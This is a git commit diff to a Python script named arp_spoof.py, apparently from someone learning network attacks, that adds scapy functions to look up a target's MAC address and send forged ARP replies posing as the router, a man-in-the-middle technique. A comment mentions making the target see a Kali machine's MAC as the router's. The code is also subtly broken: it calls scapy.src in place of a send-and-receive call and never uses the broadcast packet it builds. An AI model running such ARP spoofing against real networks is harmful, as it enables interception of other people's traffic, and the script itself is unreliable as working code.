ee3d9d0b57599619e90bcddca2099a725436794d
Hem Parekh <54116609+Hem1700@users.noreply.github.com>
2021-02-21 21:14:06 +0530

    Get mac function added

--- arp_spoof.py
+++ arp_spoof.py
@@ -2,4 +2,20 @@
 
 import scapy.all as scapy
 
-packet = scapy.ARP(op=2, pdst = "192.168.1.103", hwdst= "c8:b2:9b:0d:17:13" , psrc = "192.168.0.1")
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.src(arp_request, timeout = 1, verbose = False)[0]
+    return answered_list[0][1].hwsrc
+
+def spoof(target_ip , spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst = target_ip, hwdst= target_mac , psrc = spoof_ip)
+    # print(packet.show())
+    # print(packet.summary()) To print the content of the packet
+    # Send the packet to the target machine giving it the kali's MAC Addresss as the address of thr router
+    scapy.send(packet)
+
+
+get_mac("192.168.1.104")
